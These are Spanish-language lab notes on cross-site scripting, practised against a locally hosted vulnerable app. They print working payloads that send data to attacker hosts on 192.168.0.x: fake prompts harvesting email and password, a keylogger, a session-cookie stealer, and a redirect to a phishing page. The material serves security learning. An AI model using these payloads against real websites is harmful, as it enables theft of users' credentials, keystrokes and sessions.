Esta vulnerabilidad permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales. Para practicar vamos a utilizar el siguiente repositorio:
![[Pasted image 20230428095404.png]]
Nos clonamos el repositorio y entramos en la siguiente ruta:
![[Pasted image 20230428095644.png]]
Hacemos un make install y nos lo monta todo por el puerto 10007:
![[Pasted image 20230428095740.png]]
Y accedemos a este panel:
![[Pasted image 20230428095845.png]]
Por lo que nos creamos dos cuentas, el usuario mario con contraseña password1 y el usuario penguin con la contraseña 123123:
![[Pasted image 20230428095929.png]]
![[Pasted image 20230428095946.png]]

## XSS REFLECTED - HTML INJECTION

Una vez estamos dentro, tenemos la posibilidad de crear una nueva entrada en la web para que sea publicada:
![[Pasted image 20230428100041.png]]
Y por ejemplo si publicamos algo se queda reflejado:
![[Pasted image 20230428100147.png]]
Ahora vamos a crear otra nota tratando de inyectar código html probando por ejemplo con la etiqueta h1:
![[Pasted image 20230428100313.png]]
Y vemos que se aplica esta etiqueta:
![[Pasted image 20230428100355.png]]
## Scripts de JavaScript
Viendo lo anterior, podemos inyectar código javascript para establecer que la página web víctima ejecute cierto código y alterar así su comportamiento:
![[Pasted image 20230428100657.png]]
Y si ejecutamos esto, se nos abrirá un pop-up:
![[Pasted image 20230428100739.png]]
![[Pasted image 20230428100750.png]]
## INGENIERÍA SOCIAL EN XSS
Podemos inyectar código javascript que solicite al usuario víctima que inserte un correo, a través de este código:
```javascript
<script>
        var email = prompt("Introduce tu email: ");

        if (email == null || email == ""){
         alert("Hay que poner un correo válido");
        } else {
         fetch("http://192.168.0.57/" + email);
        }
</script>
```
![[Pasted image 20230428101528.png]]
Y ahora si accedemos al post, nos pide un email:
![[Pasted image 20230428101544.png]]
Y si nos ponemos en escucha con netcat, habremos recibido el correo del usuario:
![[Pasted image 20230428101652.png]]
No obstante, si quisiéramos también pedir la contraseña al usuario, podríamos usar este código:
```javascript
<script>
        var email = prompt("Introduce tu email: ");
        var password = prompt("Introduce tu contraseña: ");

        if (email == null || email == ""){
         alert("Hay que poner un correo válido");
        } else {
         fetch("http://192.168.0.57/" + email + password);
        }
</script>
```
Y nos pide el correo y después la contraseña:
![[Pasted image 20230428102059.png]]
![[Pasted image 20230428102136.png]]

## XSS PERSISTENTE

El payload se almacena en las bases de datos de la aplicación por medio de entradas que permanecen siempre en la página, como comentarios, foros, etc:

## Keylogger con javascript

Si queremos crear un keylogger para ir capturando las pulsaciones del teclado de un usuario, lo haría con el siguiente código
```javascript
<script>
        var k = "";
        document.onkeypress = function(e){
         e = e || window.event;
         k += e.key;
         var i = new Image();
         i.src = "http://192.168.0.32/" + k;
};
</script>
```
![[Pasted image 20230428102840.png]]
Y ahora si vamos al post llamado keylogger y escribimos en alguna parte, veremos como todo lo que se escriba se habrá registrado:
![[Pasted image 20230428102956.png]]
## Redirigir al Usuario a otra Web
También podemos redirigir al usuario a otra web de forma automática utilizando este código:
```javascript
<script>
window.location.href="https://google.es";
</script>
```
![[Pasted image 20230428103518.png]]
Y ahora si hacemos clic a este post publicado, nos llevará a google (o a la página phising correspondiente):
![[Pasted image 20230428103548.png]]
![[Pasted image 20230428103555.png]]
## Capturar Cookie de Sesión con XSS
Podemos crear un código javascript para que nos muestre la cookie de sesión del usuario. Por lo que primero tenemos que comprobar que dentro de los ajustes de la web, la cookie no se encuentre protegida, ya que debe aparecer de esta forma:
![[Pasted image 20230428104537.png]]
Y después tenemos que poner este código:
```javascript
<script>
   alert(document.cookie);
</script>
```
![[Pasted image 20230428104826.png]]
Y vemos la cookie de sesión (aunque de momento solo se le muestra al mismo usuario):
![[Pasted image 20230428104929.png]]
Para poder robar la cookie de inicio de sesión del usuario, necesitaremos primeroe este código:
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.0.19/?cookie=' + document.cookie);
request.send();
```
![[Pasted image 20230428105423.png]]
Y con python si nos ponemos en escucha deberíamos de recibir la cookie de sesión:
![[Pasted image 20230428105738.png]]
